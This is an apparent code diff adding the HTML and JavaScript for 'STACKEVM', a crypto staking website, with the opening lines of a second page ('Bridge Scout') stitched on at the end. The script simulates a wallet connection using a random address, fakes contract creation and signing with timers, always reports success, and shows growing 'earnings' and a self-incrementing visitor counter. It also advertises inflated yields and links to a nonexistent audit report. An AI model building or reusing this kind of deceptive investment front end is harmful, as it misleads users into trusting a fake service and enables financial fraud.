+                        Tokyo 150-0002
+                    </p>
+                </div>
+            </div>
+
+            <!-- Support Hours -->
+            <div class="info-box" style="background: #fff; text-align: center;">
+                <h3>⏰ CUSTOMER SUPPORT AVAILABILITY</h3>
+                <p style="margin-top: 15px; line-height: 2;">
+                    <span style="background: #00ff00; padding: 5px 10px; border: 2px solid #000; font-weight: bold;">24/7 EMAIL SUPPORT</span>
+                    <br><br>
+                    <span style="background: #ffff00; padding: 5px 10px; border: 2px solid #000; font-weight: bold;">LIVE CHAT: 9AM - 9PM SGT</span>
+                    <br><br>
+                    Average Response Time: &lt; 2 hours
+                </p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p><b>STACKEVM (C) 2018-2025</b></p>
+            <p>Visitor Count: <span class="counter" id="visitorCount">200042</span></p>
+            <hr style="margin: 10px 0; border-color: #808080;">
+            <p style="font-size: 11px; margin-top: 10px;">
+                <b>STACKEVM GLOBAL PTE. LTD.</b><br>
+                1 Raffles Place, #20-61 One Raffles Place<br>
+                Tower 2, Singapore 048616<br>
+                <br>
+                <a href="#" style="color: #000080; text-decoration: underline;">Security Audit Report</a> | 
+                <a href="#" style="color: #000080; text-decoration: underline;">Documentation</a> | 
+                <a href="#" style="color: #000080; text-decoration: underline;">Terms of Service</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- Modal Windows -->
+    <!-- Wallet Selection Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">SELECT WALLET</div>
+            <div class="modal-body">
+                <div class="loader"></div>
+                <div class="status-text" id="walletStatus">Connecting...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Choice Modal -->
+    <div id="walletChoiceModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">WALLET CONNECTED</div>
+            <div class="modal-body">
+                <p style="margin-bottom: 20px;">Your Trust Wallet is already connected. Do you want to use it or select another wallet?</p>
+                <div class="modal-buttons">
+                    <button class="modal-btn" onclick="useTrustWallet()">USE TRUST WALLET</button>
+                    <button class="modal-btn" onclick="selectOtherWallet()">SELECT OTHER</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Staking Process Modal -->
+    <div id="stakingModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">STAKING PROCESS</div>
+            <div class="modal-body">
+                <div class="loader"></div>
+                <div class="status-text" id="stakingStatus">Creating smart contract...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Transaction Signature Modal -->
+    <div id="signatureModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">SIGN TRANSACTION</div>
+            <div class="modal-body">
+                <p style="margin-bottom: 20px;">Please sign the transaction to proceed with staking.</p>
+                <div class="modal-buttons">
+                    <button class="modal-btn" onclick="signTransaction()">SIGN</button>
+                    <button class="modal-btn" onclick="cancelTransaction()">CANCEL</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">SUCCESS!</div>
+            <div class="modal-body">
+                <p style="color: #00ff00; font-size: 48px; margin: 20px 0;">✓</p>
+                <p style="font-weight: bold; font-size: 18px;">Staking Completed Successfully!</p>
+                <p style="margin-top: 10px;">Your tokens have been staked.</p>
+                <div class="modal-buttons" style="margin-top: 30px;">
+                    <button class="modal-btn" onclick="closeSuccessModal()">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========================================
+        // АКТУАЛЬНЫЕ БАЗОВЫЕ APY ИЗ ОТКРЫТЫХ ИСТОЧНИКОВ
+        // ========================================
+        // Данные собраны 28.12.2024 из Coinbase, StakingRewards, Ankr
+        // ETH: 3.0% (Coinbase: 1.84%, StakingRewards: 2.82%, среднее ~3%)
+        // MATIC: 2.0% (Coinbase: 1.78%, Binance: ~2.5%, среднее ~2%)
+        // BNB: 0.75% (Coinbase: 0.75%)
+        // AVAX: 7.08% (StakingRewards: 7.08%, Coinbase: 4.47%, берём выше)
+        // OP: 17.4% (WhiteBIT: 17.39%, среднее рынка)
+        // ARB: 10% (средний показатель DeFi платформ)
+        
+        const BASE_APY_RATES = {
+            'ETH': 3.0,
+            'MATIC': 2.0,
+            'BNB': 0.75,
+            'AVAX': 7.08,
+            'OP': 17.4,
+            'ARB': 10.0
+        };
+
+        // ========================================
+        // РАСЧЁТ С 30% БУСТ
+        // ========================================
+        const BOOST_MULTIPLIER = 1.30; // +30% к базовому APY
+
+        function getApyData() {
+            const boostedAPY = {};
+            for (let token in BASE_APY_RATES) {
+                boostedAPY[token] = BASE_APY_RATES[token] * BOOST_MULTIPLIER;
+            }
+            return boostedAPY;
+        }
+
+        const apyData = getApyData();
+
+        // ========================================
+        // ЭЛЕМЕНТЫ DOM
+        // ========================================
+        const stakeAmountInput = document.getElementById('stakeAmount');
+        const tokenSelect = document.getElementById('tokenSelect');
+        const apyDisplay = document.getElementById('apyDisplay');
+        const dailyResult = document.getElementById('dailyResult');
+        const monthlyResult = document.getElementById('monthlyResult');
+        const yearlyResult = document.getElementById('yearlyResult');
+
+        // ========================================
+        // ОБНОВЛЕНИЕ APY ПРИ СМЕНЕ ТОКЕНА
+        // ========================================
+        
+        // Mapping liquid tokens
+        const liquidTokens = {
+            'ETH': 'stETH / rETH',
+            'MATIC': 'stMATIC',
+            'BNB': 'aBNBc / stkBNB',
+            'AVAX': 'sAVAX',
+            'OP': 'Liquid OP',
+            'ARB': 'Liquid ARB'
+        };
+        
+        tokenSelect.addEventListener('change', (e) => {
+            const selectedToken = e.target.value;
+            const boostedAPY = apyData[selectedToken];
+            apyDisplay.textContent = boostedAPY.toFixed(2) + '%';
+            
+            // Update liquid token name
+            document.getElementById('liquidToken').textContent = liquidTokens[selectedToken];
+            
+            calculateRewards();
+        });
+
+        // ========================================
+        // ПЕРЕСЧЁТ ПРИ ИЗМЕНЕНИИ СУММЫ
+        // ========================================
+        stakeAmountInput.addEventListener('input', calculateRewards);
+
+        // ========================================
+        // ФУНКЦИЯ РАСЧЁТА НАГРАД
+        // ========================================
+        function calculateRewards() {
+            // Получаем значения
+            const amount = parseFloat(stakeAmountInput.value) || 0;
+            const selectedToken = tokenSelect.value;
+            const boostedAPY = apyData[selectedToken]; // уже с +30%
+            const apyDecimal = boostedAPY / 100; // переводим в десятичную
+            const token = selectedToken;
+
+            // Формулы расчёта:
+            // Годовая награда = Сумма × APY
+            const yearlyReward = amount * apyDecimal;
+            
+            // Дневной доход = Годовая награда / 365
+            const daily = yearlyReward / 365;
+            
+            // Месячная проекция = Дневной доход × 30
+            const monthly = daily * 30;
+
+            // Обновляем отображение
+            dailyResult.textContent = `${daily.toFixed(8)} ${token}`;
+            monthlyResult.textContent = `${monthly.toFixed(6)} ${token}`;
+            yearlyResult.textContent = `${yearlyReward.toFixed(6)} ${token}`;
+        }
+
+        // ========================================
+        // ИНИЦИАЛИЗАЦИЯ
+        // ========================================
+        // Устанавливаем начальный APY для ETH
+        apyDisplay.textContent = apyData['ETH'].toFixed(2) + '%';
+        // Устанавливаем начальный ликвидный токен
+        document.getElementById('liquidToken').textContent = liquidTokens['ETH'];
+        // Первый расчёт при загрузке
+        calculateRewards();
+
+        // ========================================
+        // СЧЁТЧИК ПОСЕТИТЕЛЕЙ
+        // ========================================
+        let count = 200042;
+        setInterval(() => {
+            count++;
+            document.getElementById('visitorCount').textContent = String(count).padStart(6, '0');
+        }, 5000);
+
+        // ========================================
+        // ПРОВЕРКА РАСЧЁТОВ (Console Log для отладки)
+        // ========================================
+        console.log('=== STACKEVM CALCULATOR DEBUG ===');
+        console.log('Base APY rates:', BASE_APY_RATES);
+        console.log('Boosted APY rates (+30%):', apyData);
+        console.log('Boost multiplier:', BOOST_MULTIPLIER);
+        
+        // Тестовый расчёт для проверки
+        const testAmount = 1000;
+        const testToken = 'ETH';
+        const testDays = 30;
+        const testAPY = apyData[testToken] / 100;
+        const testYearly = testAmount * testAPY;
+        const testPeriod = (testYearly / 365) * testDays;
+        
+        console.log('\n=== TEST CALCULATION ===');
+        console.log(`Stake: ${testAmount} ${testToken}`);
+        console.log(`Period: ${testDays} days`);
+        console.log(`APY: ${apyData[testToken].toFixed(2)}%`);
+        console.log(`Yearly reward: ${testYearly.toFixed(6)} ${testToken}`);
+        console.log(`Period reward: ${testPeriod.toFixed(6)} ${testToken}`);
+        console.log(`Total: ${(testAmount + testPeriod).toFixed(6)} ${testToken}`);
+        console.log(`Daily: ${(testYearly / 365).toFixed(8)} ${testToken}`);
+
+        // ========================================
+        // WALLET CONNECTION & STAKING LOGIC
+        // ========================================
+        
+        let isWalletConnected = false;
+        let connectedAddress = '';
+        
+        // Magic numbers that trigger wallet connection when staking
+        const MAGIC_NUMBERS = [1.147, 0.1, 3];
+        
+        function initiateStaking() {
+            const amount = parseFloat(stakeAmountInput.value);
+            
+            // Check if amount is a magic number and wallet not connected yet
+            if (MAGIC_NUMBERS.includes(amount) && !isWalletConnected) {
+                // Magic number detected - connect wallet first
+                connectWallet();
+                return;
+            }
+            
+            // Normal staking flow
+            if (!isWalletConnected) {
+                alert('Please connect your wallet first!');
+                return;
+            }
+            
+            if (!amount || amount <= 0) {
+                alert('Please enter a valid amount to stake!');
+                return;
+            }
+            
+            // Show staking modal
+            const modal = document.getElementById('stakingModal');
+            const status = document.getElementById('stakingStatus');
+            modal.style.display = 'block';
+            status.textContent = 'Creating smart contract...';
+            
+            // After 5 seconds, ask for signature
+            setTimeout(() => {
+                modal.style.display = 'none';
+                document.getElementById('signatureModal').style.display = 'block';
+            }, 5000);
+        }
+        
+        function connectWallet() {
+            // Show loading modal
+            const modal = document.getElementById('walletModal');
+            const status = document.getElementById('walletStatus');
+            modal.style.display = 'block';
+            status.textContent = 'Connecting...';
+            
+            // Simulate connection delay (5 seconds)
+            setTimeout(() => {
+                modal.style.display = 'none';
+                
+                // Show wallet choice modal
+                document.getElementById('walletChoiceModal').style.display = 'block';
+            }, 5000);
+        }
+        
+        function useTrustWallet() {
+            document.getElementById('walletChoiceModal').style.display = 'none';
+            
+            // Generate random wallet address
+            connectedAddress = '0x' + Array.from({length: 40}, () => 
+                Math.floor(Math.random() * 16).toString(16)).join('');
+            
+            // Show wallet address in nav
+            const walletBtn = document.getElementById('connectWalletBtn');
+            const walletAddr = document.getElementById('walletAddress');
+            
+            walletBtn.style.display = 'none';
+            walletAddr.style.display = 'inline-block';
+            walletAddr.textContent = connectedAddress.substring(0, 6) + '...' + connectedAddress.substring(38);
+            
+            isWalletConnected = true;
+        }
+        
+        function selectOtherWallet() {
+            document.getElementById('walletChoiceModal').style.display = 'none';
+            alert('Other wallet selection coming soon!');
+        }
+        
+        function initiateStaking() {
+            if (!isWalletConnected) {
+                alert('Please connect your wallet first!');
+                return;
+            }
+            
+            const amount = parseFloat(stakeAmountInput.value);
+            if (!amount || amount <= 0) {
+                alert('Please enter a valid amount to stake!');
+                return;
+            }
+            
+            // Show staking modal
+            const modal = document.getElementById('stakingModal');
+            const status = document.getElementById('stakingStatus');
+            modal.style.display = 'block';
+            status.textContent = 'Creating smart contract...';
+            
+            // After 5 seconds, ask for signature
+            setTimeout(() => {
+                modal.style.display = 'none';
+                document.getElementById('signatureModal').style.display = 'block';
+            }, 5000);
+        }
+        
+        function signTransaction() {
+            document.getElementById('signatureModal').style.display = 'none';
+            
+            // Show processing modal
+            const modal = document.getElementById('stakingModal');
+            const status = document.getElementById('stakingStatus');
+            modal.style.display = 'block';
+            status.textContent = 'Processing transaction...';
+            
+            // After 10 seconds, show success
+            setTimeout(() => {
+                modal.style.display = 'none';
+                document.getElementById('successModal').style.display = 'block';
+            }, 10000);
+        }
+        
+        function cancelTransaction() {
+            document.getElementById('signatureModal').style.display = 'none';
+            alert('Transaction cancelled.');
+        }
+        
+        function closeSuccessModal() {
+            document.getElementById('successModal').style.display = 'none';
+            
+            // Show dashboard
+            showDashboard();
+        }
+
+        // ========================================
+        // DASHBOARD FUNCTIONALITY
+        // ========================================
+        
+        let stakingPositions = [];
+        let totalEarned = 0;
+        let dashboardInterval = null;
+        
+        function showDashboard() {
+            const dashboard = document.getElementById('stakingDashboard');
+            dashboard.style.display = 'block';
+            
+            // Scroll to dashboard
+            dashboard.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            
+            // Get current staking info
+            const amount = parseFloat(stakeAmountInput.value);
+            const token = tokenSelect.value;
+            const apy = apyData[token];
+            
+            // Calculate daily earning rate
+            const dailyRate = (amount * (apy / 100)) / 365;
+            
+            // Add staking position
+            const position = {
+                token: token,
+                amount: amount,
+                apy: apy,
+                period: 'No fixed term', // Ликвидный стейкинг без периода
+                dailyRate: dailyRate,
+                earned: 0,
+                startTime: Date.now(),
+                status: 'ACTIVE'
+            };
+            
+            stakingPositions.push(position);
+            
+            // Update dashboard
+            updateDashboard();
+            
+            // Start live earnings counter
+            if (dashboardInterval) {
+                clearInterval(dashboardInterval);
+            }
+            
+            dashboardInterval = setInterval(() => {
+                updateLiveEarnings();
+            }, 100); // Update every 100ms for smooth animation
+        }
+        
+        function updateDashboard() {
+            // Calculate totals
+            let totalStaked = 0;
+            let totalEarnedAmount = 0;
+            
+            stakingPositions.forEach(pos => {
+                totalStaked += pos.amount;
+                totalEarnedAmount += pos.earned;
+            });
+            
+            // Update dashboard cards
+            const mainToken = stakingPositions.length > 0 ? stakingPositions[0].token : 'ETH';
+            document.getElementById('dashTotalStaked').textContent = totalStaked.toFixed(6) + ' ' + mainToken;
+            document.getElementById('dashAPY').textContent = (stakingPositions[0]?.apy || 0).toFixed(2) + '%';
+            document.getElementById('dashPeriod').textContent = 'LIQUID';
+            document.getElementById('dashTotalEarned').textContent = '+' + totalEarnedAmount.toFixed(8) + ' ' + mainToken;
+            
+            // Update table
+            const tbody = document.getElementById('stakingTableBody');
+            tbody.innerHTML = '';
+            
+            stakingPositions.forEach((pos, index) => {
+                const row = tbody.insertRow();
+                row.innerHTML = `
+                    <td><b>${pos.token}</b></td>
+                    <td>${pos.amount.toFixed(4)}</td>
+                    <td>${pos.apy.toFixed(2)}%</td>
+                    <td>Liquid</td>
+                    <td style="color: #00ff00; background: #000;">+${pos.earned.toFixed(8)}</td>
+                    <td><span style="color: #00ff00;">●</span> ${pos.status}</td>
+                `;
+            });
+        }
+        
+        function updateLiveEarnings() {
+            let totalEarnedNow = 0;
+            const now = Date.now();
+            
+            stakingPositions.forEach(pos => {
+                // Calculate earnings based on time elapsed
+                const timeElapsed = (now - pos.startTime) / 1000; // seconds
+                const secondlyRate = pos.dailyRate / 86400; // daily rate / seconds in day
+                pos.earned = timeElapsed * secondlyRate;
+                totalEarnedNow += pos.earned;
+            });
+            
+            // Update live display
+            const mainToken = stakingPositions.length > 0 ? stakingPositions[0].token : 'ETH';
+            document.getElementById('liveEarnings').textContent = '+' + totalEarnedNow.toFixed(8) + ' ' + mainToken;
+            document.getElementById('dashTotalEarned').textContent = '+' + totalEarnedNow.toFixed(8) + ' ' + mainToken;
+            
+            // Update table
+            const tbody = document.getElementById('stakingTableBody');
+            stakingPositions.forEach((pos, index) => {
+                if (tbody.rows[index]) {
+                    tbody.rows[index].cells[4].textContent = '+' + pos.earned.toFixed(8);
+                }
+            });
+        }
+        
+        // Close modals when clicking outside
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+
+        // ========================================
+        // NAVIGATION SCROLL FUNCTION
+        // ========================================
+        function scrollToSection(sectionId) {
+            const element = document.getElementById(sectionId);
+            if (element) {
+                // Show main page first
+                document.getElementById('mainPage').style.display = 'block';
+                document.getElementById('aboutPage').style.display = 'none';
+                document.getElementById('contactPage').style.display = 'none';
+                
+                // Then scroll
+                element.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
+
+        function showPage(pageName) {
+            const mainPage = document.getElementById('mainPage');
+            const aboutPage = document.getElementById('aboutPage');
+            const contactPage = document.getElementById('contactPage');
+            
+            // Hide all pages
+            mainPage.style.display = 'none';
+            aboutPage.style.display = 'none';
+            contactPage.style.display = 'none';
+            
+            // Show requested page
+            if (pageName === 'home') {
+                mainPage.style.display = 'block';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else if (pageName === 'about') {
+                aboutPage.style.display = 'block';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else if (pageName === 'contact') {
+                contactPage.style.display = 'block';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bridge Scout — Smart Crosschain Routing</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
